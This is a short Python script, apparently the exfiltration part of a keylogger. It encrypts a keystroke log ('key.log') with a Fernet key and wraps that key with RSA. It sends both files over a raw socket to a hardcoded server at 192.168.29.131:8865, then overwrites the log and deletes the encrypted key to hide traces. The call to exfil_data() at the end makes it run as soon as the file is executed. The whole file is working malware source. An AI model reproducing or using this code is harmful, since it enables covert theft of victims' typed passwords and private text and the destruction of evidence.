import socket
import os
from cryptography.fernet import Fernet
import rsa

log_file = 'key.log'


def prep_key():
    key = open('fernet.key', 'rb').read()
    asym_key = rsa.PublicKey.load_pkcs1(open('public.pem', 'rb').read())
    open('fernet.enc', 'wb').write(rsa.encrypt(key, asym_key))
    return 0


def symm_encrypt(text):
    key = Fernet(open('fernet.key', 'rb').read())
    return key.encrypt(text)


def encrypt_logs():
    data = open(log_file, 'rb').read()
    with open(log_file, 'wb') as logfile:
        logfile.write(symm_encrypt(data))


def del_logs(tmp_log):
    open(log_file, 'wb').write(tmp_log)
    os.remove('fernet.enc')


def send_data(file, recv_fname, data=None):
    SERVER = '192.168.29.131'
    PORT = 8865

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER, PORT))

    '''
    if file == 0: then we are sending reading data from a file but a variable in data
    '''
    data = open(file, 'rb').read()
    recv_fname = recv_fname+' '*(1024-len(recv_fname))
    print(f'[!]\tSending file: {recv_fname}')
    client.send(recv_fname.encode())

    client.sendall(data)
    client.send('<END OF FILE>'.encode())
    print('okok')
    client.close()


def exfil_data():
    prep_key()
    encrypt_logs()
    send_data(log_file, 'key.log')
    send_data('fernet.enc', 'fernet.key')
    del_logs(b'hello world')


exfil_data()
